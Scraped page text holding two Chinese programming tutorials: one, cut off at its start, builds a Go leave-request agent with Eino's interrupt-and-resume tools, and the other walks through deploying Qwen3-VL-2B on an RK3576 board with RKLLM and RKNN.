data-id="heading-0">开发一个简单的帮助请假的agent，用户通过输入请假信息，agent自动完成请假信息补充，发起请假流程</h5>
<p>1、安装依赖</p>
<pre><code class="hljs language-shell" lang="shell">go get -u github.com/cloudwego/eino@latest
go get -u github.com/cloudwego/eino-ext/components/model/openai@late
</code></pre>
<p>2、新建一个循环agent，用于判断用户输入的请假信息是否完整，如果不完整，询问用户输入相关的信息,核心在于创建一个工具，通过工具中断agent，获取问题用户的回答</p>
<pre><code class="hljs language-go" lang="go">inferTool, err := utils.InferTool(
    <span class="hljs-string">"askQuestions"</span>,
    <span class="hljs-string">"询问用户补充信息"</span>,
    <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(ctx context.Context, input InferToolInput)</span></span> (<span class="hljs-type">string</span>, <span class="hljs-type">error</span>) {
       interrupted, _, storedState := compose.GetInterruptState[<span class="hljs-type">string</span>](ctx)
       <span class="hljs-keyword">if</span> !interrupted {
          <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>, compose.StatefulInterrupt(ctx, input, input)
       }
       flow, data, t := compose.GetResumeContext[<span class="hljs-type">string</span>](ctx)
       <span class="hljs-keyword">if</span> !flow {
          <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>, compose.StatefulInterrupt(ctx, input, storedState)
       }
       fmt.Println(<span class="hljs-string">"###"</span>, t)
       <span class="hljs-keyword">if</span> !data || t == <span class="hljs-string">""</span> {
          <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>, fmt.Errorf(<span class="hljs-string">"tool resumed without a user answer"</span>)
       }

       <span class="hljs-keyword">return</span> t, <span class="hljs-literal">nil</span>
    })
<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
    <span class="hljs-built_in">panic</span>(err)
}
</code></pre>
<pre><code class="hljs language-go" lang="go">analysisAgent, _ := adk.NewChatModelAgent(context.Background(), &amp;adk.ChatModelAgentConfig{
       Name:        <span class="hljs-string">"leaveAnalysisAgent"</span>,
       Model:       chatModel,
       Description: <span class="hljs-string">"分析缺少请假信息"</span>,
       Instruction: <span class="hljs-string">`你是一个请假流程信息分析专家，根据提供的请假信息，分析以下请假关键信息
1、请假的开始和结束时间
2、请假的类型
3、请假的原因
如果请假的信息已经完整，请输入"EXIT:请假信息已完整" 来结束请假信息补充流程
`</span>,
    })

    askAgent, err := adk.NewChatModelAgent(context.Background(), &amp;adk.ChatModelAgentConfig{
       Name:        <span class="hljs-string">"completeLeaveInfo"</span>,
       Model:       chatModel,
       Description: <span class="hljs-string">"根据分析结果询问用户补充请假信息"</span>,
       Instruction: <span class="hljs-string">`根据前面的信息补充问题，使用askQuestions工具，补充请假信息`</span>,
       ToolsConfig: adk.ToolsConfig{
          ToolsNodeConfig: compose.ToolsNodeConfig{
             Tools: []tool.BaseTool{
                inferTool,
             },
          },
       },
    })

    exitAgent, err := adk.NewChatModelAgent(context.Background(), &amp;adk.ChatModelAgentConfig{
       Name:        <span class="hljs-string">"exitController"</span>,
       Model:       chatModel,
       Description: <span class="hljs-string">"控制优化循环的退出"</span>,
       Instruction: <span class="hljs-string">`检查前面的分析结果，如果请假流程信息分析专家认为请假信息已经完整（包含"EXIT"关键词），
则输出 "TERMINATE" 并生成退出动作来结束循环。否则继续下一轮优化。`</span>,
    })

    agent, err := adk.NewLoopAgent(context.Background(), &amp;adk.LoopAgentConfig{
       Name:        <span class="hljs-string">"leaveLoop"</span>,
       Description: <span class="hljs-string">"请假信息补充循环：分析缺少请假信息-&gt;询问用户补充请假信息-&gt;检查退出条件"</span>,
       SubAgents: []adk.Agent{
          analysisAgent,
          askAgent,
          exitAgent,
       },
       MaxIterations: <span class="hljs-number">5</span>,
    })

    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
       <span class="hljs-built_in">panic</span>(err)
    }

    leaveApproveTool, err := utils.InferTool[LeaveInfo, <span class="hljs-type">string</span>](<span class="hljs-string">"leaveApproveTool"</span>, <span class="hljs-string">"发起请假流程"</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(ctx context.Context, input LeaveInfo)</span></span> (output <span class="hljs-type">string</span>, err <span class="hljs-type">error</span>) {
       log.Println(<span class="hljs-string">"发起请假入参："</span>, input)
       <span class="hljs-keyword">return</span> <span class="hljs-string">"success"</span>, err
    })

    modelAgent, err := adk.NewChatModelAgent(context.Background(), &amp;adk.ChatModelAgentConfig{
       Name:        <span class="hljs-string">"leaveApproveAgent"</span>,
       Model:       chatModel,
       Description: <span class="hljs-string">"发起请假流程"</span>,
       Instruction: <span class="hljs-string">"根据前面的请假信息，使用leaveApproveTool发起请假流程"</span>,
       ToolsConfig: adk.ToolsConfig{
          ToolsNodeConfig: compose.ToolsNodeConfig{
             Tools: []tool.BaseTool{
                leaveApproveTool,
             },
          },
       },
    })
</code></pre>
<p>3、创建一个请假流程发起agent，请假信息补充完成之后，发起请假流程</p>
<pre><code class="hljs language-go" lang="go">leaveApproveTool, err := utils.InferTool[LeaveInfo, <span class="hljs-type">string</span>](<span class="hljs-string">"leaveApproveTool"</span>, <span class="hljs-string">"发起请假流程"</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(ctx context.Context, input LeaveInfo)</span></span> (output <span class="hljs-type">string</span>, err <span class="hljs-type">error</span>) {
    log.Println(<span class="hljs-string">"发起请假入参："</span>, input)
    <span class="hljs-keyword">return</span> <span class="hljs-string">"success"</span>, err
})

modelAgent, err := adk.NewChatModelAgent(context.Background(), &amp;adk.ChatModelAgentConfig{
    Name:        <span class="hljs-string">"leaveApproveAgent"</span>,
    Model:       chatModel,
    Description: <span class="hljs-string">"发起请假流程"</span>,
    Instruction: <span class="hljs-string">"根据前面的请假信息，使用leaveApproveTool发起请假流程"</span>,
    ToolsConfig: adk.ToolsConfig{
       ToolsNodeConfig: compose.ToolsNodeConfig{
          Tools: []tool.BaseTool{
             leaveApproveTool,
          },
       },
    },
})
</code></pre>
<p>4、创建顺序流将整个流程串联起来，运行同时输入我们的信息<code>帮我从今天起请两天假</code>,查看打印agent的思考过程以及结果</p>
<pre><code class="hljs language-go" lang="go">sequentialAgent, err := adk.NewSequentialAgent(context.Background(), &amp;adk.SequentialAgentConfig{
       Name:        <span class="hljs-string">"leaveSequentialAgent"</span>,
       Description: <span class="hljs-string">"请假工作流"</span>,
       SubAgents: []adk.Agent{
          agent,
          modelAgent,
       },
    })

    runner := adk.NewRunner(context.Background(), adk.RunnerConfig{
       Agent:           sequentialAgent,
       CheckPointStore: store.NewInMemoryStore(),
       EnableStreaming: <span class="hljs-literal">true</span>,
    })

    iter := runner.Query(context.Background(), <span class="hljs-string">"帮我从今天起请两天假"</span>, adk.WithCheckPointID(<span class="hljs-string">"deep-analysis-1"</span>))
    <span class="hljs-keyword">for</span> {
       lastEvent, interrupted := processEvents(iter)
       <span class="hljs-keyword">if</span> !interrupted {
          <span class="hljs-keyword">break</span>
       }

       interruptCtx := lastEvent.Action.Interrupted.InterruptContexts[<span class="hljs-number">0</span>]
       interruptID := interruptCtx.ID
       fmt.Println(interruptCtx.Info.(InferToolInput).Question)
       fmt.Println(<span class="hljs-string">"输入你的答案"</span>)
       <span class="hljs-keyword">var</span> answer <span class="hljs-type">string</span>
       n, err := fmt.Scanln(&amp;answer)
       <span class="hljs-keyword">if</span> n != <span class="hljs-number">1</span> || err != <span class="hljs-literal">nil</span> {
          <span class="hljs-built_in">panic</span>(err)
       }
       iter, err = runner.ResumeWithParams(context.Background(), <span class="hljs-string">"deep-analysis-1"</span>, &amp;adk.ResumeParams{
          Targets: <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]any{
             interruptID: answer,
          },
       })
       <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
          <span class="hljs-built_in">panic</span>(err)
       }

    }

}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">processEvents</span><span class="hljs-params">(iter *adk.AsyncIterator[*adk.AgentEvent])</span></span> (*adk.AgentEvent, <span class="hljs-type">bool</span>) {
    <span class="hljs-keyword">var</span> lastEvent *adk.AgentEvent
    <span class="hljs-keyword">for</span> {
       event, ok := iter.Next()
       <span class="hljs-keyword">if</span> !ok {
          <span class="hljs-keyword">break</span>
       }
       <span class="hljs-keyword">if</span> event.Err != <span class="hljs-literal">nil</span> {
          log.Fatal(event.Err)
       }

       PrintContent(event)
       lastEvent = event
    }

    <span class="hljs-keyword">if</span> lastEvent == <span class="hljs-literal">nil</span> {
       <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">false</span>
    }
    <span class="hljs-keyword">if</span> lastEvent.Action != <span class="hljs-literal">nil</span> &amp;&amp; lastEvent.Action.Interrupted != <span class="hljs-literal">nil</span> {
       <span class="hljs-keyword">return</span> lastEvent, <span class="hljs-literal">true</span>
    }
    <span class="hljs-keyword">return</span> lastEvent, <span class="hljs-literal">false</span>
}
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">PrintContent</span><span class="hljs-params">(event *adk.AgentEvent)</span></span> {
    <span class="hljs-keyword">if</span> event.Output != <span class="hljs-literal">nil</span> &amp;&amp; event.Output.MessageOutput != <span class="hljs-literal">nil</span> {
       output := event.Output.MessageOutput
       <span class="hljs-keyword">if</span> output.IsStreaming {
          stream := output.MessageStream
          <span class="hljs-keyword">if</span> stream != <span class="hljs-literal">nil</span> {

             <span class="hljs-keyword">for</span> {
                chunk, err := stream.Recv()
                <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
                   <span class="hljs-keyword">if</span> err == io.EOF {
                      <span class="hljs-keyword">break</span>
                   }
                   fmt.Printf(<span class="hljs-string">"error: %v"</span>, err)
                   <span class="hljs-keyword">return</span>
                }
                <span class="hljs-keyword">if</span> chunk.ReasoningContent != <span class="hljs-string">""</span> {
                   fmt.Print(chunk.ReasoningContent)
                }
                <span class="hljs-keyword">if</span> chunk.Content != <span class="hljs-string">""</span> {
                   fmt.Print(chunk.Content)
                }

             }

          }

       } <span class="hljs-keyword">else</span> {
          message := output.Message
          <span class="hljs-keyword">if</span> message != <span class="hljs-literal">nil</span> {
             <span class="hljs-keyword">if</span> message.Content != <span class="hljs-string">""</span> {
                log.Print(message)
             }

             <span class="hljs-keyword">if</span> message.ReasoningContent != <span class="hljs-string">""</span> {
                fmt.Print(message.ReasoningContent)
             }

          }
       }

    }

    <span class="hljs-keyword">if</span> event.Action != <span class="hljs-literal">nil</span> {
       <span class="hljs-keyword">if</span> event.Action.TransferToAgent != <span class="hljs-literal">nil</span> {
          fmt.Printf(<span class="hljs-string">"\naction: transfer to %v"</span>, event.Action.TransferToAgent.DestAgentName)
       }

       <span class="hljs-keyword">if</span> event.Action.Interrupted != <span class="hljs-literal">nil</span> {
          <span class="hljs-keyword">for</span> _, ic := <span class="hljs-keyword">range</span> event.Action.Interrupted.InterruptContexts {
             str, ok := ic.Info.(fmt.Stringer)
             <span class="hljs-keyword">if</span> ok {
                fmt.Printf(<span class="hljs-string">"\n%s"</span>, str.String())
             } <span class="hljs-keyword">else</span> {
                fmt.Printf(<span class="hljs-string">"\n%v"</span>, ic.Info)
             }
          }
       }
       <span class="hljs-keyword">if</span> event.Action.Exit {
          fmt.Printf(<span class="hljs-string">"\naction: exit"</span>)
       }
    }

    <span class="hljs-keyword">if</span> event.Err != <span class="hljs-literal">nil</span> {
       fmt.Printf(<span class="hljs-string">"\nerror: %v"</span>, event.Err)
    }

}

<span class="hljs-keyword">type</span> InferToolInput <span class="hljs-keyword">struct</span> {
    Question <span class="hljs-type">string</span> <span class="hljs-string">`json:"question" jsonschema:"required;description=你需要询问的问题"`</span>
}

<span class="hljs-keyword">type</span> LeaveInfo <span class="hljs-keyword">struct</span> {
    StartDate   <span class="hljs-type">string</span> <span class="hljs-string">`json:"startDate" jsonschema:"required;description=请假开始时间"`</span>
    EndDate     <span class="hljs-type">string</span> <span class="hljs-string">`json:"endDate" jsonschema:"required;description=请假结束时间"`</span>
    LeaveType   <span class="hljs-type">string</span> <span class="hljs-string">`json:"leaveType" jsonschema:"required;description=请假类型"`</span>
    LeaveReason <span class="hljs-type">string</span> <span class="hljs-string">`json:"leaveReason" jsonschema:"required;description=请假原因"`</span>
}
</code></pre>
<p>5、查看结果</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/467ca95f7c1347a3ab9220dc1ba6869a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MzA3NTAwOTMwMzc5Mw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769061583&amp;x-signature=SLQ5xROdydcj%2FD9gQ39IGsHIims%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/987869c9f6864c6d8e5b8651f6a0d18e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MzA3NTAwOTMwMzc5Mw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769061583&amp;x-signature=cpAhap8pGZpzce6gXQHWx8WXDOM%3D" alt="image.png" loading="lazy"/></p>
<p>总结：整体体验不错，agent的中断和恢复，可以灵活的完成各种场景</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Qwen3-VL-2B 在 RK3576 上的部署实践：RKNN + RKLLM 全流程]]></title>    <link>https://juejin.cn/post/7595157651619987482</link>    <guid>https://juejin.cn/post/7595157651619987482</guid>    <pubDate>2026-01-15T06:22:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595157651619987482" data-draft-id="7595108457496199183" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Qwen3-VL-2B 在 RK3576 上的部署实践：RKNN + RKLLM 全流程"/> <meta itemprop="keywords" content="算法"/> <meta itemprop="datePublished" content="2026-01-15T06:22:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="FastMoMO"/> <meta itemprop="url" content="https://juejin.cn/user/854760647561804"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Qwen3-VL-2B 在 RK3576 上的部署实践：RKNN + RKLLM 全流程
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/854760647561804/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    FastMoMO
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T06:22:10.000Z" title="Thu Jan 15 2026 06:22:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>本文记录一次完整、可复现的工程实践：<br/>
在 <strong>RK3576</strong> 平台上，将多模态大模型 <strong>Qwen3-VL-2B</strong> 拆分并部署到 NPU 上运行。</p>
<p>目标不是介绍工具功能，而是让读者：</p>
<blockquote>
<p><strong>按照本文步骤执行代码，最终在板端成功跑起多模态推理 Demo。</strong></p>
</blockquote>
<hr/>
<h2 data-id="heading-0">一、整体部署流程总览（先看全局）</h2>
<p>在 RK 平台上，多模态模型<strong>无法以单一模型部署</strong>，必须拆分为两个子模型：</p>
<ul>
<li>Vision Encoder → <code>.rknn</code></li>
<li>LLM Decoder → <code>.rkllm</code></li>
</ul>
<p>整体流程如下：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/494cb71355e94d34a0d852ce79687ad6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRmFzdE1vTU8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769062930&amp;x-signature=foIZxc7HqboN4y0iZSr0p%2FTgpTw%3D" alt="Image" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0a3c454a970e4f48a11680db74c46da0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRmFzdE1vTU8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769062930&amp;x-signature=T3zWC1KixG4eMd3qSfuXtYWMfO4%3D" alt="Image" loading="lazy"/></p>
<p><strong>本文最终产物：</strong></p>
<pre><code class="hljs">qwen3-vl_vision_rk3576.rknn
qwen3-vl-2b-instruct_w8a8_rk3576.rkllm
</code></pre>
<hr/>
<h2 data-id="heading-1">二、环境准备（必须一致）</h2>
<h3 data-id="heading-2">1️⃣ 主机环境（模型转换）</h3>





















<table><thead><tr><th>项目</th><th>版本</th></tr></thead><tbody><tr><td>OS</td><td>Ubuntu 22.04 x86_64</td></tr><tr><td>Python</td><td>3.10</td></tr><tr><td>工具</td><td>Miniforge / Conda</td></tr></tbody></table>
<h3 data-id="heading-3">2️⃣ 开发板环境</h3>





















<table><thead><tr><th>项目</th><th>说明</th></tr></thead><tbody><tr><td>芯片</td><td>RK3576</td></tr><tr><td>系统</td><td>Linux</td></tr><tr><td>推理</td><td>NPU</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-4">三、模型准备</h2>
<p>拉取 Qwen3-VL-2B 模型（HuggingFace / ModelScope 均可）：</p>
<pre><code class="hljs language-bash" lang="bash">git <span class="hljs-built_in">clone</span> https://huggingface.co/Qwen/Qwen3-VL-2B-Instruct
</code></pre>
<p>假设模型路径为：</p>
<pre><code class="hljs language-bash" lang="bash">/workspace/Qwen3-VL-2B-Instruct
</code></pre>
<hr/>
<h2 data-id="heading-5">四、LLM 部分：RKLLM 转换与量化（核心）</h2>
<h3 data-id="heading-6">4.1 加载模型</h3>
<pre><code class="hljs language-ini" lang="ini">from rkllm.api import RKLLM

<span class="hljs-attr">llm</span> = RKLLM()

<span class="hljs-attr">ret</span> = llm.load_huggingface(
    <span class="hljs-attr">model</span>=<span class="hljs-string">"/workspace/Qwen3-VL-2B-Instruct"</span>,
    <span class="hljs-attr">device</span>=<span class="hljs-string">"cpu"</span>,
    <span class="hljs-attr">dtype</span>=<span class="hljs-string">"float16"</span>,
)

if ret != 0:
    raise RuntimeError("load_huggingface failed")
</code></pre>
<p><strong>说明：</strong></p>
<ul>
<li>使用 CPU 转换，避免显存不足</li>
<li>FP16 对 w8a8 量化足够</li>
</ul>
<hr/>
<h3 data-id="heading-7">4.2 构建量化数据集（关键步骤）</h3>
<p>多模态模型不能直接量化原始图像输入，需要先构造 <code>inputs_embeds</code>。</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">inputs_embeds</span> = model.get_input_embeddings()(inputs[<span class="hljs-string">"input_ids"</span>])

<span class="hljs-attr">image_mask</span> = inputs[<span class="hljs-string">"input_ids"</span>] == model.config.image_token_id
<span class="hljs-attr">image_embeds</span> = model.visual(
    inputs<span class="hljs-section">["pixel_values"]</span>,
    <span class="hljs-attr">grid_thw</span>=inputs[<span class="hljs-string">"image_grid_thw"</span>]
)

inputs_embeds<span class="hljs-section">[image_mask]</span> = image_embeds
</code></pre>
<p>将 <code>inputs_embeds</code> 保存为 numpy，用于量化校准：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np
np.<span class="hljs-title function_">save</span>(<span class="hljs-string">"inputs_embeds.npy"</span>, inputs_embeds.<span class="hljs-title function_">cpu</span>().<span class="hljs-title function_">numpy</span>())
</code></pre>
<p>最终生成 <code>inputs.json</code>，作为 RKLLM 的校准数据集。</p>
<hr/>
<h3 data-id="heading-8">4.3 构建并导出 RKLLM 模型</h3>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">ret</span> = llm.build(
    <span class="hljs-attr">do_quantization</span>=<span class="hljs-literal">True</span>,
    <span class="hljs-attr">quantized_dtype</span>=<span class="hljs-string">"w8a8"</span>,
    <span class="hljs-attr">quantized_algorithm</span>=<span class="hljs-string">"normal"</span>,
    <span class="hljs-attr">target_platform</span>=<span class="hljs-string">"RK3576"</span>,
    <span class="hljs-attr">num_npu_core</span>=<span class="hljs-number">2</span>,
    <span class="hljs-attr">dataset</span>=<span class="hljs-string">"data/inputs.json"</span>
)

if ret != 0:
    raise RuntimeError("build failed")

llm.export_rkllm(
    "qwen3-vl-2b-instruct_w8a8_rk3576.rkllm"
)
</code></pre>
<hr/>
<h2 data-id="heading-9">五、Vision 部分：ONNX → RKNN</h2>
<h3 data-id="heading-10">5.1 导出 Vision ONNX</h3>
<pre><code class="hljs language-css" lang="css">python export_vision<span class="hljs-selector-class">.py</span> \
  <span class="hljs-attr">--path</span> /workspace/Qwen3-VL-<span class="hljs-number">2</span>B-Instruct \
  <span class="hljs-attr">--model_name</span> qwen3-vl \
  <span class="hljs-attr">--height</span> <span class="hljs-number">448</span> \
  <span class="hljs-attr">--width</span> <span class="hljs-number">448</span>
</code></pre>
<p>输出：</p>
<pre><code class="hljs">qwen3-vl_vision.onnx
</code></pre>
<hr/>
<h3 data-id="heading-11">5.2 ONNX 转 RKNN</h3>
<pre><code class="hljs language-css" lang="css">python export_vision_rknn<span class="hljs-selector-class">.py</span> \
  <span class="hljs-attr">--path</span> qwen3-vl_vision<span class="hljs-selector-class">.onnx</span> \
  <span class="hljs-attr">--target-platform</span> rk3576 \
  <span class="hljs-attr">--height</span> <span class="hljs-number">448</span> \
  <span class="hljs-attr">--width</span> <span class="hljs-number">448</span>
</code></pre>
<p>输出：</p>
<pre><code class="hljs">qwen3-vl_vision_rk3576.rknn
</code></pre>
<hr/>
<h2 data-id="heading-12">六、板端部署与运行</h2>
<h3 data-id="heading-13">6.1 拷贝文件到开发板</h3>
<pre><code class="hljs language-vbnet" lang="vbnet">qwen3-vl_vision_rk3576.rknn
qwen3-vl-<span class="hljs-number">2</span>b-instruct_w8a8_rk3576.rkllm
demo
<span class="hljs-keyword">lib</span>/
</code></pre>
<hr/>
<h3 data-id="heading-14">6.2 设置运行环境</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">export</span> LD_LIBRARY_PATH=./lib:<span class="hljs-variable">$LD_LIBRARY_PATH</span>
</code></pre>
<hr/>
<h3 data-id="heading-15">6.3 运行 Demo</h3>
<pre><code class="hljs language-bash" lang="bash">./demo demo.jpg \
  qwen3-vl_vision_rk3576.rknn \
  qwen3-vl-2b-instruct_w8a8_rk3576.rkllm \
  256 2048 2 \
  <span class="hljs-string">"&lt;|vision_start|&gt;"</span> <span class="hljs-string">"&lt;|vision_end|&gt;"</span> <span class="hljs-string">"&lt;|image_pad|&gt;"</span>
</code></pre>
<p><strong>参数说明：</strong></p>
<ul>
<li><code>vision_start / vision_end</code>：标识视觉 embedding 边界</li>
<li><code>image_pad</code>：多图或补齐占位符</li>
</ul>
<hr/>
<h2 data-id="heading-16">七、结果验证</h2>
<p>运行成功后，终端会输出模型对图片内容的描述或回答。</p>
<p>至此，一个 <strong>完整的端侧多模态推理流程部署完成</strong>。</p>
<hr/>
<h2 data-id="heading-17">八、实践总结</h2>
<ol>
<li>RK 平台多模态模型必须拆分</li>
<li>RKLLM 的核心是量化与运行时管理</li>
<li>量化数据准备是成功关键</li>
<li>w8a8 是当前最稳妥的工程选择</li>
